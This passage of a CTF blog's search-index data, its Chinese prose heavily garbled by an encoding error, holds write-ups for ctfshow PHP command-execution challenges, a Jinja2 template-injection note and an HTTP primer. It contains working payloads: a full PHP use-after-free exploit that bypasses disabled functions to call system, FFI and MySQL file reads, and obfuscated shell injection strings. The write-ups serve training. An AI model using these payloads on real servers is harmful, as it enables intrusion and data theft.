¦æ„å»º36å³å¯ï¼Œæ²¡æœ‰è¿‡æ»¤`$`ï¼Œè€Œåœ¨Linuxä¸­$æ˜¯å˜é‡çš„å…³é”®å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å˜é‡\n\n```\n$(())è¿™ä¸ªå˜é‡ä¸­çš„()ä»£è¡¨æ•°å­¦è¿ç®—ï¼Œç»“æœä¸º0ï¼Œæ‰€ä»¥\necho $(())\n0\nå¯¹è¿™ä¸ªå˜é‡è¿›è¡Œå–åæ“ä½œç»“æœä¸º\necho ~$(())\n~0\né‚£ä¹ˆæˆ‘ä»¬å†å¯¹~0è¿›è¡Œæ•°å­¦è¿ç®—å¾—åˆ°çš„ç»“æœå°±æ˜¯\necho $((~$(())))\n~1\næ‰€ä»¥æˆ‘ä»¬æƒ³å¾—åˆ°36å°±æ˜¯è®©36ä¸ª~1ç›¸åŠ å†å–å\necho $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n##### 58\n\n```\npayload:\nPOST\nc=file_get_contents('flag.php')\n```\n\nå‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°\n\né¦–å…ˆå°è¯•systemå‘ç°è¢«è¿‡æ»¤äº†ï¼Œemmmmå°è¯•è¿‡åå‘ç°èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å…¨è¢«ç¦ç”¨äº†\n\né‚£ä¹ˆå°è¯•èƒ½å¦è¯»å–æ–‡ä»¶ï¼Œä½¿ç”¨file_get_contentsè¯»å–æˆåŠŸï¼Œæç¤ºä¸­ä¹Ÿæ˜¾ç¤ºshow_sourceåŒæ ·å¯ç”¨\n\n##### 59\n\n```\npayload:\nPOST\nc=show_source('flag.php')\n```\n\nèƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å°±åˆ«è¯•äº†ï¼Œå…¨æŒ‚äº†\n\nshow_sourceå¯ç”¨\n\nè¿˜å¯å°è¯•é€šè¿‡includeæ¥åŒ…å«æ–‡ä»¶ï¼Œå†é€šè¿‡PHPä¼ªåè®®è¿›è¡Œè¯»å–\n\n```\npayload:?file=php://filter/read=convert.base64-encode/resource=flag.php\nPOST\nc=include($_GET['flie']);\n```\n\n##### 60\n\n```\npayload:\nPOST\nc=highlight_file('flag.php');\n```\n\nä¸Šä¸€é¢˜å¯ç”¨çš„æ–¹æ³•ä¹Ÿå¯\n\n##### 61\n\nåŒä¸Š\n\n##### 62\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\nä¸Šé¢æ‰€æœ‰æ–¹æ³•çš†å¯\n\n##### 63\n\n```\npayload:\nPOST\nc=include('flag.php');var_dump(get_defined_vars());\n```\n\n`get_defined_vars()`å¯è·å¾—æ‰€æœ‰å·²å®šä¹‰çš„å˜é‡ï¼Œå½“ä¸çŸ¥é“å˜é‡åæ—¶å¯ä½¿ç”¨è¿™ä¸ª\n\nä¸Šé¢æ–¹æ³•åŒæ ·ğŸ‰‘ï¸\n\n##### 64\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n`scandir('.')`å¯ç”¨äºæ‰«ææ–‡ä»¶ï¼Œå’Œlsä¸€ä¸ªæ„æ€ï¼Œå½“æˆ‘ä»¬ä¸çŸ¥é“æ–‡ä»¶åæ—¶å¯ä½¿ç”¨\n\n##### 65\n\nåŒä¸Š\n\n##### 66\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-19 17.49.25.png)\n\nå°è¯•å¤±è´¥è¿˜è¢«å˜²è®½äº†ï¼Œé¦–å…ˆæ‰«æä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag.txtï¼Œ`highlight_file('/flag.txt')`è¯»å–å³å¯\n\n```\npayload:\nPOST\nc=highlight_file('/flag.txt');\n```\n\n##### 67\n\nåŒä¸Š\n\n##### 68\n\n```\npayload:\nPOST\nc=include('/flag.txt')\n```\n\nå±äºæ˜¯ç¦»è°±äº†ï¼Œç›´æ¥å°äº†`highlight_file`å‡½æ•°ï¼Œ`var_dump(scandir('/'))`ï¼Œå‘ç°åœ¨æ ¹ç›®å½•ä¸­ï¼Œç›´æ¥includeæ–‡ä»¶ï¼Œæ²¡æœ‰phpæ ‡ç­¾å³ä¸ºç›´æ¥æ˜¾ç¤ºæºç ï¼Œç­‰äºç›´æ¥æ˜¾ç¤ºflag.txtçš„å†…å®¹\n\n##### 69\n\nåŒä¸Š\n\n##### 70\n\nç»§ç»­ç™½å«–\n\n##### 71\n\n```\npayload:\nPOST\nc=include('/flag.txt');exit();\n```\n\nå°è¯•ç™½å«–å‘ç°å¤±è´¥ï¼Œä¸‹è½½æºç è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°åœ¨è¾“å‡ºä¹‹å‰å°†ç¼“å†²åŒºä¸­çš„æ‰€æœ‰æ•°å­—å­—æ¯æ¢æˆäº†é—®å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬è®©å®ƒåŒ…å«å®Œç›´æ¥é€€å‡ºå°±è¡Œäº†\n\n##### 72\n\næ–‡ä»¶æ¢ä½ç½®äº†å“­å“­ï¼Œscandiræ‰¾ä¸åˆ°æ ¹ç›®å½•ï¼Œvar_dumpä¹Ÿæ²¡äº†ï¼Œå“­å“­\n\nçœ‹æç¤º\n\né¦–å…ˆæ‰¾å‡ºæ–‡ä»¶å\n\n```PHP\npayload:\nPOST\nc=$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} exit(0);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-19 23.52.16.png)uafè„šæœ¬å¦‚ä¸‹\n\n```PHP\n<?php\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace();\n            if(!isset($backtrace[1]['args'])) {\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr & 0xff));\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { \n\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { \n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) {\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) {\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; \n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); \n    write($abc, 0xd0 + 0x68, $zif_system); \n\n    ($helper->b)($cmd);\n    exit();\n}\n\nctfshow(\"cat /flag0.txt\");ob_end_flush();\n?>\n\n```\n\næœ€ç»ˆ\n\n```\npayload:\nPOST\nc=ä¸Šé¢çš„ä»£ç \n```\n\n##### 73\n\nåŒä¸Šï¼Œæ–‡ä»¶åæ›´æ”¹ä¸ºflagc\n\n##### 74\n\n```\npayload:\nPOST\nc=include('/flagx.txt');exit();\n```\n\né¦–å…ˆæ‰«ç›®å½•ï¼ŒåŒä¸Šé¢˜payloadï¼Œè€Œåå‘ç°åœ¨æ ¹ç›®å½•æœ‰flagx.txtå°è¯•åŒ…å«æˆåŠŸ\n\n##### 75\n\nbanæ‰äº†open_basedirè®¿é—®æ–‡ä»¶çš„æ–¹å¼ï¼Œåªèƒ½é€šè¿‡åˆ«çš„æ–¹æ³•æ¥è®¿é—®æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡mysqlè®¿é—®ï¼Œåœ¨å‰é¢å‡ é¢˜ä¸­å¯ä»¥æ‰¾åˆ°mysqlçš„è´¦å·å¯†ç ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```PHP\npayload:\nPOST\nc=try {\n  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');\n  foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n\t{\n    echo($row[0]); \n  }\n  $dbh = null;\n}\ncatch (PDOException $e) \n{\n  echo $e->getMessage();\n  exit(0);\n}\nexit(0);\n```\n\næ‹“å±•PDOçŸ¥è¯†ï¼š\n\n```PHP\nPHP æ•°æ®å¯¹è±¡ ï¼ˆPDOï¼‰ æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚\nPDO æä¾›äº†ä¸€ä¸ªæ•°æ®è®¿é—®æŠ½è±¡å±‚ï¼Œè¿™æ„å‘³ç€ï¼Œä¸ç®¡ä½¿ç”¨å“ªç§æ•°æ®åº“ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ¥æŸ¥è¯¢å’Œè·å–æ•°æ®ã€‚\nPDOéšPHP5.1å‘è¡Œï¼Œåœ¨PHP5.0çš„PECLæ‰©å±•ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæ— æ³•è¿è¡Œäºä¹‹å‰çš„PHPç‰ˆæœ¬ã€‚\nä¸€ä¸ªå®ä¾‹\n<?php\n$dbms='mysql';     //æ•°æ®åº“ç±»å‹\n$host='localhost'; //æ•°æ®åº“ä¸»æœºå\n$dbName='test';    //ä½¿ç”¨çš„æ•°æ®åº“\n$user='root';      //æ•°æ®åº“è¿æ¥ç”¨æˆ·å\n$pass='';          //å¯¹åº”çš„å¯†ç \n$dsn=\"$dbms:host=$host;dbname=$dbName\";\n\ntry {\n    $dbh = new PDO($dsn, $user, $pass); //åˆå§‹åŒ–ä¸€ä¸ªPDOå¯¹è±¡\n    echo \"è¿æ¥æˆåŠŸ<br/>\";\n    /*ä½ è¿˜å¯ä»¥è¿›è¡Œä¸€æ¬¡æœç´¢æ“ä½œ\n    foreach ($dbh->query('SELECT * from FOO') as $row) {\n        print_r($row); //ä½ å¯ä»¥ç”¨ echo($GLOBAL); æ¥çœ‹åˆ°è¿™äº›å€¼\n    }\n    */\n    $dbh = null;\n} catch (PDOException $e) {\n    die (\"Error!: \" . $e->getMessage() . \"<br/>\");\n}\n//é»˜è®¤è¿™ä¸ªä¸æ˜¯é•¿è¿æ¥ï¼Œå¦‚æœéœ€è¦æ•°æ®åº“é•¿è¿æ¥ï¼Œéœ€è¦æœ€ååŠ ä¸€ä¸ªå‚æ•°ï¼šarray(PDO::ATTR_PERSISTENT => true) å˜æˆè¿™æ ·ï¼š\n$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));\n\n?>\n```\n\n##### 76\n\nåŒä¸Šæ”¹åå­—\n\n##### 77\n\né¦–å…ˆè¿˜æ˜¯æ‰«ç›®å½•ï¼Œæ–‡ä»¶åflag36x.txtï¼Œå°è¯•ä¸Šé¢˜æ–¹æ³•å‘ç°æ•°æ®åº“æ¶ˆå¤±ï¼Œçœ‹æç¤ºæ˜¯PHP7.4ä»¥ä¸Šçš„æ–°ç‰¹æ€§ï¼Œå¯ä»¥é€šè¿‡æ–°å»ºä¸€ä¸ªFFIå¯¹è±¡æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œåˆå› ä¸ºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤åæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠæ‰§è¡Œåçš„ç»“æœæ”¾åˆ°ç½‘ç«™ç›®å½•ä¸‹çš„ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­è¿›è¡Œè¯»å–\n\n```php\npayload:\nPOST\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > /var/www/html/1.txt';\n$ffi->system($a);\n```\n\nç„¶åè®¿é—®/1.txtå³å¯\n\n##### 118\n\né¦–å…ˆæŸ¥çœ‹æºç ï¼Œå‘ç°è¾“å…¥è¢«åŒ…å«åˆ°systemå‡½æ•°ä¸­æ‰§è¡Œï¼Œå°è¯•`echoï¼Œwhoamiï¼Œlsï¼Œcat`å…¨éƒ¨å¤±æ•ˆæƒ³æ–¹æ³•ç»•è¿‡ï¼Œè¾“å…¥ç©ºæ ¼å‘ç°å¯ä»¥æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥å°è¯•é€šè¿‡æ„é€ ç³»ç»Ÿå˜é‡æ¥æ‰§è¡Œï¼ŒæŸ¥çœ‹æç¤ºçš„å›¾ç‰‡\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-21 16.39.03.png)\n\nå‘ç°æ˜¯é»˜è®¤é…ç½®æ–‡ä»¶ä¸‹çš„æ–‡ä»¶ååˆ—è¡¨ï¼Œå¯ä»¥é€šè¿‡å‰ªè£æ„é€ å˜é‡ï¼Œè¯»å–æ–‡ä»¶å‘½ä»¤æœ€å®¹æ˜“è¿›è¡Œæ„é€ çš„å°±æ˜¯`nl`ï¼Œæƒ³æ‹¼æ¥å‡ºnlåªéœ€è¦å–ç³»ç»Ÿé…ç½®å˜é‡æœ€åä¸€ä½nå’Œå½“å‰æ‰§è¡Œç›®å½•æœ€åä¸€ä½lå³å¯ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:${PATH:~0}${PWD:~0}$IFS????.???\n```\n\nå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œæ˜¯å› ä¸ºè¿‡æ»¤äº†æ•°å­—ï¼Œæ²¡å…³ç³»ï¼Œå‰ªè£å­—ç¬¦è¿˜å¯é€šè¿‡å¤§å†™å­—æ¯è§£å†³ï¼ŒçœŸÂ·æœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:${PATH:~A}${PWD:~A}$IFS????.???\n```\n\n**ç³»ç»Ÿå˜é‡è¡¥å……çŸ¥è¯†**\n\n```\n$PATH ç³»ç»Ÿé…ç½®å˜é‡\n$PWD å½“å‰æ‰§è¡Œç›®å½•\n$HOME é»˜è®¤è¿›å…¥çš„ç›®å½•\n$SHELL\n$USER å½“å‰user\n$SHLVL ä»£è¡¨å½“å‰shellçª—å£çš„æ·±åº¦ï¼Œä¸€èˆ¬ä¸º1\n$PHP_CFLAGS æŒ‡å®šå¤´æ–‡ä»¶ï¼ˆ.hæ–‡ä»¶ï¼‰çš„è·¯å¾„ï¼Œå¦‚ï¼šCFLAGS=-I/usr/include -I/path/includeã€‚åŒæ ·åœ°ï¼Œå®‰è£…ä¸€ä¸ªåŒ…æ—¶ä¼šåœ¨å®‰è£…è·¯å¾„ä¸‹å»ºç«‹ä¸€ä¸ªincludeç›®å½•ï¼Œå½“å®‰è£…è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜æ—¶ï¼Œè¯•ç€æŠŠä»¥å‰å®‰è£…çš„åŒ…çš„includeç›®å½•åŠ å…¥åˆ°è¯¥å˜é‡ä¸­æ¥ã€‚\n$PHP_VERSION PHPç‰ˆæœ¬\n\n```\n\n**Linuxå˜é‡è¡¥å……çŸ¥è¯†**\n\n```\n${å˜é‡å:ä»å“ªä¸€ä½å¼€å§‹å–:å–å¤šé•¿}ï¼Œå¦‚æ²¡æœ‰é•¿åº¦é»˜è®¤å–åˆ°æœ€åï¼Œå¦‚æœæ²¡æœ‰èµ·å§‹ä½å°±ä»å¤´å¼€å§‹\n${#å˜é‡å}ï¼Œä»£è¡¨è¿™ä¸ªå˜é‡çš„é•¿åº¦\n$\n```\n\n##### 119\n\nå…ˆå°è¯•ä¸Šä¸€æŠŠçš„æ˜¯å¦å¯è¡Œï¼Œä¸è¡Œæ‰€ä»¥ç›´æ¥çœ‹æç¤ºå§ï¼Œç³»ç»Ÿå˜é‡çš„çŸ¥è¯†è¡¥å……åœ¨ä¸Šä¸€é“é¢˜äº†ï¼Œé’ˆå¯¹æœ¬é¢˜\n\n```\nSHLVLçš„å€¼ä¸º2ï¼Œ#SHLVLçš„å€¼ä¸º1ï¼Œä»PHP_VERSIONçš„ç¬¬äºŒä½å–ä¸€ä¸ªä¸º3ï¼Œä¹Ÿå°±æ˜¯${PHP_VERSION:${SHLVL}:${#SHLVL}}ä¸º3ï¼Œæœ€ç»ˆå–\nPHP_CFLAGSå˜é‡ä»ç¬¬ä¸‰ä½å¼€å§‹çš„å‰ä¸‰ä¸ªå³å¯æ„é€ tac\n```\n\næœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:${PHP_CFLAGS:${PHP_VERSION:${SHLVL}:${#SHLVL}}:${PHP_VERSION:${SHLVL}:${#SHLVL}}} ????.???\n```\n\n##### 120\n\nä¸Šä¸€æŠŠçš„å­—ç¬¦å¤ªé•¿äº†ï¼Œåªèƒ½é€šè¿‡åˆ«çš„å‘½ä»¤è¯»å–äº†\n\n```\ntipsï¼šLinuxä¸­çš„base64åœ¨/binç›®å½•ä¹‹ä¸‹ï¼Œbase64 æ–‡ä»¶åå³å¯å°†æ–‡ä»¶è¿›è¡Œbase64ç¼–ç \n```\n\næ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆæ„é€ å‡ºç»“æœä¸º/bin/base64 flag.phpå³å¯\n\né¦–å…ˆæ˜¯/å­—ç¬¦ï¼ŒPWDé¦–ä½ï¼Œè€Œåbinå¯ä½¿ç”¨é€šé…ç¬¦ï¼Œå°è¯•base64ä¹Ÿä½¿ç”¨é€šé…ç¬¦ä¸å¯è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•æ„å»ºå‡ºæ•°å­—4æ¥åŒ¹é…\n\n```\ntipsï¼šRANDOMå˜é‡èƒ½ç”Ÿæˆä¸€ä¸‡ä»¥å†…çš„éšæœºæ•°ï¼Œç”¨#å–é•¿åº¦å³å¯æœ‰æ¦‚ç‡å¾—åˆ°4\n```\n\næœ€ç»ˆpayload\n\n```\npayload:\nPOST\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n~~å¤šåˆ·æ–°å‡ æ¬¡æ€»ä¼šå‡ºæ¥çš„~~\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-21 19.36.51.png)\n\n##### 121\n\nå°è¯•ä¸Šé¢˜payloadï¼Œå‘ç°SHLVLè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ª1\n\n```\ntips:é€šè¿‡$?æ¥å®ç°çš„ï¼Œ$?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯\n```\n\næ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨${#?}å³å¯æ„é€ å‡º1ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:\nPOST\ncode=AAAAAAAAA\ncode=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???\n```\n\n##### 122\n\næ»¤äº†PWDä½†æ˜¯æœ‰HOMEï¼ŒHOMEæ›¿æ¢PWDå°±è¡Œï¼Œæ»¤äº†#å·æ²¡å‘å»é•¿åº¦ï¼ŒRANDOMå–ä¸€ä½å³å¯ï¼Œéšæœºåˆ°äº†å°±æ˜¯èƒœåˆ©\n\n```\npayload:\nPOST\ncode=A;${PWD::${?}}???${PWD::${?}}?????${RANDOM} ????.???\n```\n\n","tags":["CTF","web"]},{"title":"Web_python_template_injection","url":"/2022/02/04/Web-python-template-injection/","content":"\n# Pythonæ¨¡ç‰ˆæ³¨å…¥\n\n## æ¼æ´æˆå› \n\n`instance.__class__` å¯ä»¥è·å–å½“å‰å®ä¾‹çš„ç±»å¯¹è±¡\n\n`class.__mro__` è·å–å½“å‰ç±»å¯¹è±¡çš„æ‰€æœ‰ç»§æ‰¿ç±»\n\næ¯ä¸€ä¸ªæ–°å¼ç±»éƒ½ä¿ç•™äº†å®ƒæ‰€æœ‰çš„å­ç±»çš„å¼•ç”¨ï¼Œ`__subclasses__()`è¿™ä¸ªæ–¹æ³•è¿”å›äº†ç±»çš„æ‰€æœ‰å­˜æ´»çš„å­ç±»çš„å¼•ç”¨ï¼ˆæ³¨æ„æ˜¯ç±»å¯¹è±¡å¼•ç”¨ï¼Œä¸æ˜¯å®ä¾‹ï¼‰\n\n<!--more-->\n\nåœ¨Jinja2æ¨¡æ¿å¼•æ“ä¸­ï¼Œ`{{}}`æ˜¯å˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ã€‚`{{}}`å¹¶ä¸ä»…ä»…å¯ä»¥ä¼ é€’å˜é‡ï¼Œè¿˜å¯ä»¥æ‰§è¡Œä¸€äº›ç®€å•çš„è¡¨è¾¾å¼ã€‚\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»»æ„æ„é€ ä¸€ä¸ªå˜é‡`xxx.__class__.__mro__[-1].__subclasses__()`æ¥è·å–è¯¥Pythonç¨‹åºä¸­æ‰€æœ‰ä½¿ç”¨çš„æ¨¡å—\n\nå†ä½¿ç”¨å¯¹åº”ä½ç½®çš„æ¨¡å—é€šè¿‡`__init__`è¿›è¡Œåˆå§‹åŒ–ï¼Œ`__globals['å˜é‡']__`è¿›è¡Œä¼ å‚è¿›è€Œè¿›è¡Œè°ƒç”¨\n\nè€Œåæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pythonä¸­çš„os.popenæ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤\n\né€šç”¨payloadå¦‚ä¸‹\n\n`{{xxx.__class__.__mro__[-1].__subclasses__()[site._Printeræ¨¡å—å¯¹åº”ä½ç½®].__init__.__globals__['os'].system('è¦æ‰§è¡Œçš„å‘½ä»¤')}}`\n\n`{{xxx.__class__.__mro__[-1].__subclasses__()[flieæ¨¡å—å¯¹åº”ä½ç½®]('æ–‡ä»¶åç§°').read()}}å¯ç”¨äºè¯»å–æ–‡ä»¶`\n\nå¦‚é¢˜ç›®ä¸­è¿‡æ»¤äº†å…³é”®å­—ï¼Œå¯å°è¯•é€šè¿‡getä¼ å‚ä¼ å…¥å‚æ•°ï¼Œå¦‚`{{[request.args.a]}}?a=__class__`\n","tags":["-CTF -web -python"]},{"title":"Pythonäºwebå±‚åº”ç”¨","url":"/2022/01/25/Pythonäºwebå±‚åº”ç”¨/","content":"\n# Pythonäºwebå±‚åº”ç”¨\n\n## HTTPåè®®åŸºç¡€\n\n### åè®®åˆ†ç±»\n\nHTTP 1.0 80ç«¯å£ å•æ¬¡ä¸€ä¸ªé“¾æ¥\n\nHTTP 1.1 80ç«¯å£ å¤šæ¬¡å¯ä¸€ä¸ªé“¾æ¥\n\nHTTPåè®®ä¸å¤Ÿå®‰å…¨ï¼Œè¿›è€Œå‘å±•å‡ºäº†HTTPSåè®®\n\nHTTPS 443ç«¯å£ åŠ å¯†åæ•°æ®ä¼ è¾“\n\n<!--more-->\n\n### è¯·æ±‚æ–¹æ³•\n\n###### HTTP 1.0\n\nGET POST HEAD\n\n###### HTTP 1.1ä¸HTTPS\n\nOPTIONS PUT DELETE TRACE CONNECT PATCH\n\n### URLæ ¼å¼\n\nåè®®://ä¸»æœºå.åŸŸå/æ–‡ä»¶å¤¹/æ–‡ä»¶?å‚æ•°=å€¼&å‚æ•°=å€¼\n\n### HTTPè¯·æ±‚å¤´\n\nUser-Agentï¼šæµè§ˆå™¨ç‰ˆæœ¬ä¿¡æ¯\n\nAccept-encodingï¼šæµè§ˆå™¨æ¥å—çš„ç¼–ç \n\nRefererï¼šå½“å‰ç½‘é¡µè·³è½¬æ¥æº\n\nCookieï¼šé¡¾åæ€ä¹‰ï¼Œ~~å¥½åƒçš„é¥¼å¹²ï¼Œ~~Cookieä¿¡æ¯\n\nLocationï¼šè·³è½¬åˆ°å“ªé‡Œ\n\nSet-Cookieï¼šè®¾ç½®Cookieä¿¡æ¯\n\nWWW-Authenticateï¼šç”¨äºèº«ä»½éªŒè¯HTTP Basicç­‰\n\n### HTTPå“åº”çŠ¶æ€ç \n\n1XXï¼šä¿¡æ¯æç¤º\n\n2XXï¼šæˆåŠŸ\n\n3XXï¼šé‡å®šå‘\n\n4XXï¼šå®¢æˆ·ç«¯é”™è¯¯\n\n5XXï¼šæœåŠ¡ç«¯é”™è¯¯\n\n### æŸ¥çœ‹HTTP\n\nä½¿ç”¨æµè§ˆå™¨å®¡æŸ¥è¿›è¡ŒæŸ¥çœ‹\n\nä½¿ç”¨Burpsuiteæˆªæ–­æŸ¥çœ‹\n\n## 